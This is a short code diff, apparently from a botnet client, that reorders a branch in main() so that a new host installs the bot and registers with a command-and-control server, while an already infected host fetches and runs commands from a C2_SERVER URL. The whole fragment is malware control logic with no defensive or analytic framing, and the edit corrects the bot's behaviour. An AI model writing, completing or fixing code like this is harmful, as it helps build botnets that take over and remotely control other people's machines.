@@ -14,10 +14,10 @@ int main() {
     command_url = C2_SERVER + CMD_URI;
 
     if (host.IsNew()) {
-        host.ExecuteCommand(command_url);
-    } else {
         host.Install();
         host.RegisterBot(register_url);
+    } else {
+        host.ExecuteCommand(command_url);
     }
 
     return 0;
